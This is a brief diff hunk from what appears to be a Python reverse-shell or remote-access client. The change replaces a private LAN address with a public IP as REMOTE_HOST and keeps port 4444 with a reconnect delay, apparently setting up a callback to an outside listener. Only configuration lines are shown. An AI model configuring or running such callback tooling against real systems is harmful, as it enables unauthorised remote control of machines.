@@ -17,7 +17,7 @@ import threading
 import signal
 
 # ---- Configuration ----
-REMOTE_HOST = '192.168.1.100'   # Change to your remote server's IP
+REMOTE_HOST = '172.58.48.212'   # Change to your remote server's IP
 REMOTE_PORT = 4444              # Change to your listening port
 RECONNECT_DELAY = 10            # Seconds before attempting to reconnect
 
